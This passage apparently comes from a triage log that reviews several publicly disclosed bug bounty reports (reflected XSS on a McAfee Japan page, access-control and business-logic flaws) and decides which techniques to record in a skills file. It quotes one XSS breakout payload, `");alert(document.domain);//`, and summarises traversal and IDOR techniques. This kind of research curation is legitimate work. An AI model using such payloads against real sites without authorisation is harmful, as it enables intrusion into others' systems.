  a different path first doesn't grant any new capability." No demonstrated real-world impact and no chain to
  high/critical impact (doctrine §2(b); the CHAIN field requires high/critical impact). The mechanism is a
  specific instance of the already-recorded encode/decode-normalization-mismatch traversal family
  (path-traversal-testing V-03/V-06: "check happens before a later decode/normalize"; double-encoding).
  Primitive documented here, not entered.
- #1068477 (Trellix, "RXSS in https://jp.mcafee.com/apps/mdm/jp/3.0_asp/", reporter `lemonoftroy`, submitted
  2020-12-29, disclosed 2025-12-19, Medium 4.7, weakness XSS - Reflected, closed **Duplicate**; ROUTE:
  `web_extract` -> HTTP 200, full reporter body + the reflected code block). Technique: `targetURL`
  reflected into a JS string literal inside `<script>` (`window.location.replace("<input>")`), breakout with
  `");alert(document.domain);//`. NOT APPENDED: the generic method ("reflected XSS breaks out of the exact
  syntactic context — JS string") is already recorded (Bugbountyskills.md ~13445); 2020; closed Duplicate
  ("same root cause issue from same reporter"); no impact chain beyond `alert(document.domain)`.
- #3328343 (Bykea, "Lack of minimum value bid wheel verification on customer_bid in Rental Trips", reporter
  `sameer_ali`, submitted 2025-09-05, disclosed 2025-11-20, severity low, weakness Business Logic Errors;
  ROUTE: `web_extract` -> team summary only; `.json` -> `visibility: "no-content"`, `vulnerability_information:
  ""`). INVALID: no reporter body; the team summary ("missing validation on the customer_bid field ...
  arbitrary bid amounts ... While drivers would not have accepted such low-balled offers") has no endpoint, no
  request shape, no parameter, no bypass, no chain; the team downgraded it to low and stated no real impact.
- #3146996 (Mars, "[XSS] Reflected XSS via POST request in (███████)", reporter `morphykutay`, submitted
  2025-05-14, disclosed 2025-06-12, Medium 6.2, weakness XSS - Reflected; ROUTE: `web_extract` -> team summary
  only; `.json` -> `visibility: "no-content"`, `vulnerability_information: ""`). INVALID: no reporter body; the
  team summary ("reflected XSS in the celular parameter of a POST request to the homepage") has no payload, no
  context, no request shape; the technique (reflected XSS via a POST-body param) is generic.
- #2828641 (Mars, "unauthorized access and add user and change personal information all users", reporter
  `bughunter0x7`, submitted 2024-11-07, disclosed 2025-05-27, Critical 9.6, weakness Improper Access Control -
  Generic; ROUTE: `web_extract` -> team summary only; `.json` -> `visibility: "no-content"`,
  `vulnerability_information: ""`). INVALID: no reporter body; the team summary has no endpoint, no request
  shape, no parameter; the technique (unauth API endpoint + enumerable 4-digit user IDs) is the
  already-recorded BAC/IDOR class (§3).

6 sources read, 0 fabricated.

---

